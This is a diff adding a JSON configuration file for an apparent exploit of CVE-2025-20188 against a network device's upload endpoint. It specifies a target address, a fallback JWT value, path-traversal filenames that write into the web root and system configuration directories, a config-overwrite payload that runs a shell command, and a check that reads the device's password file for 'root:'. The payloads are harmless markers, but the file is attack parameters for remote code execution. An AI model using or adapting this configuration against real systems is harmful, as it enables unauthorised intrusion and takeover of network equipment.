@@ -1,0 +1,26 @@
+{
+    "target": "10.0.23.70",
+    "port": 8443,
+    "upload_endpoint": "/ap_spec_rec/upload/",
+    "upload_field": "file",
+    "jwt_req_id": "cdb_token_request_id1",
+    "jwt_fallback": "notfound",
+    "file_upload": {
+        "filename": "../../usr/binos/openresty/nginx/html/foo.txt",
+        "content": "This is a test payload for CVE-2025-20188 exploit demonstration!",
+        "verify_path": "/foo.txt"
+    },
+    "rce": {
+        "enabled": true,
+        "config_upload": {
+            "filename": "../../usr/binos/conf/custom.conf",
+            "payload": "echo 'pwned' > /tmp/rce_success; # Overwritten config with malicious command" 
+        },
+        "trigger_upload": {
+            "filename": "../../usr/binos/custom/trigger.txt",
+            "payload": "trigger_reload" 
+        },
+        "verification_endpoint": "/webui/login/etc_passwd",
+        "verification_keyword": "root:"
+    }
+}
